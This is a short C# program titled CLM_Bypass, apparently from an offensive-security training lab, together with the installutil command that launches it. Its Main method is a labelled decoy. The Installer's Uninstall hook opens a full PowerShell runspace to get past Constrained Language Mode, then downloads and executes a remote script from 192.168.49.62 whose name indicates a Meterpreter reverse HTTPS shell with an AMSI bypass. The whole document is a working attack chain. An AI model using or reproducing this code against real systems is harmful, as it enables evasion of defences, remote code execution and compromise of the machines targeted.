```c#
using System;
using System.Configuration.Install;
using System.Management.Automation;
using System.Management.Automation.Runspaces;


namespace CLM_Bypass
{
    class Program
    {
        static void Main(string[] args)
        {
            Console.WriteLine("This is the main method which is a decoy!");
        }
    }

    [System.ComponentModel.RunInstaller(true)]
    public class Sample : System.Configuration.Install.Installer
    {

        public override void Uninstall(System.Collections.IDictionary savedState)
        {
            Runspace rs = RunspaceFactory.CreateRunspace();
            rs.Open();

            PowerShell ps = PowerShell.Create();
            ps.Runspace = rs;

            String cmd = "(New-Object System.Net.WebClient).DownloadString('http://192.168.49.62/met_revhttps_443_x64_powershell_amsi.txt') | IEX";
            ps.AddScript(cmd);
            ps.Invoke();
            rs.Close();
        }
    }
}

```

```
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\installutil.exe /logfile= /LogToConsole=false /U C:\Users\student\CLM_Bypass.exe
```